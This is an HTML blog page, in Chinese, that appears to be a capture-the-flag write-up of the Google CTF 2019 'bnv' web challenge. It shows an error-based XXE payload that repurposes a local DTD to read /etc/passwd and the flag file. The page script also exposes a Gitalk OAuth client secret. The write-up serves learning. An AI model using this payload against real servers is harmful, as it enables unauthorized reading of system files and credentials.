@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>2019GoogleCTF-web-bnv XXE 题目 | NeverSec的博客 | 安全不止 | Hacking fun!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="XXE">
+    <meta name="description" content="前言Google CTF 2019 刚过不久，来一波复现~">
+<meta name="keywords" content="XXE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019GoogleCTF-web-bnv XXE 题目">
+<meta property="og:url" content="https://leezj9671.github.io/20190710/2019GoogleCTF-web-bnv.html">
+<meta property="og:site_name" content="NeverSec的博客 | 安全不止">
+<meta property="og:description" content="前言Google CTF 2019 刚过不久，来一波复现~">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d248664c176f87951.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d2487576b0f474366.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d248878db21350572.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d2488610f3bb36760.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d24884954c8528338.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d2489cf9840625370.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d248bd12f38049873.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d248c7bbd42596019.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d248f4cc96d187582.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/09/5d248fd122e0066657.png">
+<meta property="og:updated_time" content="2020-08-20T02:48:10.541Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019GoogleCTF-web-bnv XXE 题目">
+<meta name="twitter:description" content="前言Google CTF 2019 刚过不久，来一波复现~">
+<meta name="twitter:image" content="https://i.loli.net/2019/07/09/5d248664c176f87951.png">
+    
+    <link rel="shortcut icon" href="/favicon.png">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/sidebar_header.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">n3ver</h5>
+          <a href="mailto:leezj9671@gmail.com" title="leezj9671@gmail.com" class="mail">leezj9671@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                时间线
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/Leezj9671" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-link"></i>
+                关于我
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">2019GoogleCTF-web-bnv XXE 题目</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">2019GoogleCTF-web-bnv XXE 题目</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-07-10T12:32:10.000Z" itemprop="datePublished" class="page-time">
+  2019-07-10
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目"><span class="post-toc-number">2.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#搞！"><span class="post-toc-number">3.</span> <span class="post-toc-text">搞！</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#总结"><span class="post-toc-number">4.</span> <span class="post-toc-text">总结</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-2019GoogleCTF-web-bnv"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">2019GoogleCTF-web-bnv XXE 题目</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-07-10 20:32:10" datetime="2019-07-10T12:32:10.000Z"  itemprop="datePublished">2019-07-10</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://capturetheflag.withgoogle.com" target="_blank" rel="noopener">Google CTF 2019</a> 刚过不久，来一波复现~</p>
+<a id="more"></a>
+
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>题目地址是 <a href="https://bnv.web.ctfcompetition.com/" target="_blank" rel="noopener">https://bnv.web.ctfcompetition.com/</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d248664c176f87951.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>题目描述：</p>
+<blockquote>
+<p>这是一个没有啥好看的 enterprise-ready™ Web应用程序。</p>
+</blockquote>
+<h2 id="搞！"><a href="#搞！" class="headerlink" title="搞！"></a>搞！</h2><p>点开链接一看，为什么这么黑……</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d2487576b0f474366.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>从网页标题和中间的图片很明显是盲文，结合题目，应该是一个盲人用的网站？</p>
+<p>网页中央是说“请使用这个搜索引擎，找一个离你最近的组织”，下拉框有三个城市可选。</p>
+<p>先看一下搜索会发生啥吧：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d248878db21350572.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d2488610f3bb36760.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>POST 搜索接口一条 message，估计是盲文代码？然后返回了相应的信息。</p>
+<p>看一下 JavaScript 是怎么写的吧：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d24884954c8528338.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>数一数 blindvalues 数组，刚好 26 个，猜想是不是字母一一对应捏，打开 Console 验证一下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d2489cf9840625370.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>跟 message 一模一样~ 先想一想，如果该题是 SQL 注入的话，那这题只能使用纯字母，并且忽略大小写，这个有点难整啊…… 使用特殊标点符号 Fuzz 一下，一点用都没有。</p>
+<p>思来想去，搜到了一个奇妙的渗透手法：基于 Json 的 web 服务也有可能存在着 XXE 注入！试一试提交 XML：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d248bd12f38049873.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>哎嘿？似乎可行？扔一个和提交 Json 相同意义的 XML 试试？</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE message[
+    &lt;!ELEMENT message ANY&gt;
+]&gt;
+&lt;message&gt;135601360123502401401250&lt;/message&gt;</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d248c7bbd42596019.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>哎嘿？似乎成功近在眼前了？赶紧翻 payload……整了好久，在 Burp 官网上看到了一个比较新颖的使用本地 DTD 读取文件的方法 <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd" target="_blank" rel="noopener">Exploiting XXE to retrieve data by repurposing a local DTD</a></p>
+<p>这个 payload 主要是利用错误信息来打印目标文件的内容，重新定义了 <code>docbookx.dtd</code> （一般有 Gnome 就有它）里面的 <code>ISOamso</code>。我们提交了这个 payload 之后，当导入本地的 DTD 文件时，会优先执行我们定义的 <code>ISOamso</code>，因此可以达成任意文件读取。</p>
+<p>使用该 payload 成功读取：</p>
+<pre><code class="xml">&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
+    &lt;!ENTITY % ISOamso &#39;
+        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
+        &amp;#x25;eval;
+        &amp;#x25;error;
+    &#39;&gt;
+    %local_dtd;
+]&gt;</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d248f4cc96d187582.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>猜一下路径 <code>/flag</code>，对啦✔</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2019/07/09/5d248fd122e0066657.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>算是一道不错的 XXE 利用题目，又学习到了新的利用方式~</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-08-20T02:48:10.541Z" itemprop="dateUpdated">2020-08-20 10:48:10</time>
+</span><br>
+
+
+        
+        转载请注明作者和出处：<a href="/20190710/2019GoogleCTF-web-bnv.html" target="_blank" rel="external">https://leezj9671.github.io/20190710/2019GoogleCTF-web-bnv.html</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://leezj9671.github.io">
+            <img src="/img/avatar.png" alt="n3ver">
+            n3ver
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
+
+
+            
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/20190727/docker-nessus-awvs.html" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">自用Docker版Nessus和WVS破解版</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/20190515/openvqn.html" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Docker-OpenVPN搭建局域网记录</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <!-- <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"> -->
+    <link rel="stylesheet" href="https://cdn.staticfile.org/gitalk/1.5.0/gitalk.css">
+    <!-- <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script> -->
+    <script src="https://cdn.staticfile.org/gitalk/1.5.0/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'ad451cc3feb9601c7fb1',
+          clientSecret: '80a6439f8f871afa1e07a8a4a00d0aafce1f8494',
+          repo: 'Leezj9671.github.io',
+          owner: 'leezj9671',
+          admin: ['leezj9671'],
+          id: decodeURI(location.pathname),
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>n3ver &copy; 2017 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: false, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！-NeverSec';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
